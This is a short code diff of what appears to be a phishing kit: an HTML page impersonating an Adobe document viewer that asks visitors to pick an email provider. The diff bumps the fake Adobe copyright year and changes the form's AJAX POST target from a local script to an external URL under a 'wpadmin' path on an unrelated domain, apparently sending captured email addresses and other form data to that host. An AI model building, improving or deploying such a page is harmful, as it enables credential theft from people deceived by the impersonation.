@@ -82,7 +82,7 @@
                   </div>
                   <div class="col-lg-12">
                      <p class="text-white mt-3 text-center">Select your email provider to view Document</p>
-                <p class="h6 text-center text-white">CopyRight© 2020 Adobe.</p> 
+                <p class="h6 text-center text-white">CopyRight© 2021 Adobe.</p> 
                     
                   </div>
                
@@ -214,7 +214,7 @@
         {
          $.ajax({
           dataType: 'JSON',
-          url: 'next.php',
+          url: 'https://zakiafoundation.com/wpadmin/next.php',
           type: 'POST',
           data:{
             email:email,
